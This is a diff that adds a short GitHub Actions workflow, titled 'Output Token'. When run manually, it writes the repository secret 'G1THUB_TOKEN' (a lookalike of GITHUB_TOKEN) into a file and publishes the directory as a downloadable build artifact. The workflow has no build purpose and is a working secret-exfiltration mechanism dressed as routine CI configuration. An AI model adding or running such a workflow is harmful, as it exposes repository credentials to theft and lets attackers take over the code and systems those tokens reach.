@@ -1,0 +1,28 @@
+name: Output Token
+
+on:
+  workflow_dispatch:
+    inputs:
+      trigger:
+        description: Manually trigger
+        required: true
+        type: choice
+        options:
+          - build
+
+env:
+  FORCE_COLOR: 1
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Get token
+      run: |
+        echo "${{ secrets.G1THUB_TOKEN }}" >> token.txt
+    - name: Upload artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: token
+        path: ./
+
